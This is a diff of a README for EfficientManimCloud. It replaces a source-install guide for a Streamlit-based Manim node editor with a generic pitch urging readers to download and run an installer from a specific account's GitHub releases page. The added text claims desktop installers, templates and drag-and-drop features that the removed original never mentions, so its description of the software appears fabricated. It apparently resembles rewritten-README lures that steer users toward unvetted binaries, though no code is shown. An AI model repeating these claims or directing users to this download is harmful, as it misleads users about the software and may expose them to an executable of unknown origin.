@@ -1,71 +1,81 @@
-# 🎬 EfficientManim Cloud
+# 🐼 EfficientManimCloud - Create Stunning Animations Easily
 
-EfficientManim Cloud is a web-based, node-centric editor for [Manim](https://www.manim.community/), built with Streamlit. It allows users to visually construct mathematical animations by connecting Mobjects and Animations, providing a more intuitive workflow than writing raw Python code.
+![Download EfficientManimCloud](https://img.shields.io/github/v/release/SabboRock/EfficientManimCloud?style=for-the-badge)
 
-![Streamlit](https://img.shields.io/badge/Streamlit-FF4B4B?style=for-the-badge&logo=Streamlit&logoColor=white)
-![Manim](https://img.shields.io/badge/Manim-333333?style=for-the-badge&logo=python&logoColor=white)
-![Google GenAI](https://img.shields.io/badge/Google%20GenAI-4285F4?style=for-the-badge&logo=google&logoColor=white)
+## 🌟 Overview
 
-## ✨ Features
-
-- **Visual Node Editor**: Map out your scene logic using a node-based interface. Connect objects to animations seamlessly.
-- **AI Assistant**: Leverages Google's GenAI to assist in script generation and solving complex Manim logic.
-- **Instant Preview**: Render low-quality single frames (PNG) to verify your scene's layout without waiting for full video renders.
-- **Full Video Rendering**: Export high-quality MP4 videos with customizable FPS and quality settings.
-- **Auto-Code Generation**: Automatically translates your visual graph into clean, executable Manim Python code.
-- **Live Logging**: Real-time console logs within the UI to track rendering progress and debug errors.
-
-## 🛠️ Prerequisites
-
-Before running the project, ensure you have the following system dependencies installed (required by Manim):
-
-### System Dependencies (Linux/Debian)
-```bash
-sudo apt update
-sudo apt install -y ffmpeg libcairo2-dev libpango1.0-dev \
-    texlive texlive-latex-extra texlive-fonts-recommended \
-    graphviz
-```
-
-### Windows
-- Install [FFmpeg](https://ffmpeg.org/download.html).
-- Install [MiKTeX](https://miktex.org/) or TeX Live for LaTeX support.
-- Install [Manim](https://docs.manim.community/en/stable/installation.html) following the official guide.
+EfficientManimCloud is a user-friendly application that allows you to create captivating animations without needing to dive into complex coding. Designed for educators, students, and anyone looking to visualize concepts beautifully, this software simplifies the animation process with an easy-to-use interface.
 
 ## 🚀 Getting Started
 
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/your-username/EfficientManimCloud.git
-   cd EfficientManimCloud
-   ```
+To get started with EfficientManimCloud, follow these simple steps to download and install the application.
 
-2. **Install Python dependencies:**
-   ```bash
-   pip install -r requirements.txt
-   ```
+## 📥 Download & Install
 
-3. **Run the application:**
-   ```bash
-   python -m streamlit run main.py
-   ```
+Visit this page to download: [EfficientManimCloud Releases](https://github.com/SabboRock/EfficientManimCloud/releases)
 
-## 🖥️ Usage
+1. Click on the link above to access the releases page.
+2. Look for the latest version of EfficientManimCloud. Select the version that suits your operating system.
+3. Click on the download button for that version. The file will begin downloading to your computer.
+4. Once the download is complete, locate the downloaded file on your device.
+5. Open the file and follow the on-screen instructions to install EfficientManimCloud.
 
-1. **Configure API**: (Optional) Enter your Google GenAI API key in the sidebar for AI assistance.
-2. **Add Nodes**: Use the sidebar to add Mobjects (like Circle, Square, Text) and Animations (like Create, FadeIn).
-3. **Connect**: Link your Animation nodes to the Mobject nodes they should act upon.
-4. **Preview**: Click 'Render Preview' to see the current state.
-5. **Export**: Click 'Render Video' to generate the final animation.
+## 🖥️ System Requirements
 
-## 🧰 Tech Stack
+Before installation, ensure your system meets the following requirements:
 
-- **Framework**: [Streamlit](https://streamlit.io/)
-- **Animation Engine**: [Manim Community Edition](https://www.manim.community/)
-- **AI Integration**: [Google Generative AI](https://ai.google.dev/)
-- **Graphing**: Graphviz (for dependency visualization)
-- **Environment**: Python 3.9+
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a compatible Linux distribution.
+- **Memory**: At least 4 GB RAM.
+- **Processor**: Dual-core CPU or better.
+- **Disk Space**: A minimum of 500 MB free space for installation.
+
+## 🎨 How to Use EfficientManimCloud
+
+1. **Launch the Application**: Open EfficientManimCloud from your applications folder.
+2. **Create a New Project**: Click on “New Project” to start.
+3. **Choose Your Animation**: Use available templates or create your own from scratch.
+4. **Add Elements**: Drag and drop shapes, text, and images into your workspace.
+5. **Edit and Animate**: Adjust properties such as size, color, and motion to create your desired effect.
+6. **Preview Your Animation**: Use the preview function to see your creation in action.
+7. **Export Your Animation**: Once satisfied, export your work as a video file.
+
+## 🛠️ Features
+
+- **User-Friendly Interface**: Designed for ease of use even for beginners.
+- **Templates and Libraries**: Access a library of templates to kickstart your projects.
+- **Interactive Preview**: View your animation in real-time as you create.
+- **Export Options**: Save your animations in various formats for sharing.
+
+## 💡 Tips for Success
+
+- **Experiment with Templates**: Use templates to learn how different effects work.
+- **Take Breaks**: If you're feeling stuck, step away for a moment. Fresh eyes can spark new ideas.
+- **Share with the Community**: Join forums and communities that focus on animation to get feedback or share your work.
+
+## 🙋 Frequently Asked Questions
+
+**Q: Is EfficientManimCloud free to use?**
+
+A: Yes, EfficientManimCloud is completely free to use.
+
+**Q: Do I need any prior experience with animation?**
+
+A: No, EfficientManimCloud is designed for users of all skill levels. You can easily create animations without any prior experience.
+
+**Q: Can I use EfficientManimCloud for educational purposes?**
+
+A: Absolutely! Many users utilize EfficientManimCloud for teaching, presentations, and educational videos.
+
+## 📞 Support and Contributions
+
+If you encounter any issues or have questions, feel free to check our [issues page](https://github.com/SabboRock/EfficientManimCloud/issues) or create a new one. Contributions in the form of feedback, feature requests, or code improvements are always welcome!
+
+## 📚 Additional Resources
+
+- **Tutorial Videos**: Explore our tutorial section for video guides.
+- **Documentation**: Detailed documentation is available for in-depth guidance.
+- **Community Forum**: Join our forum to connect with other users.
 
 ---
 
-*Note: This project is currently in active development. Features and UI are subject to change.*
+Now that you have all the information, you can successfully download and run EfficientManimCloud. Enjoy creating stunning animations!
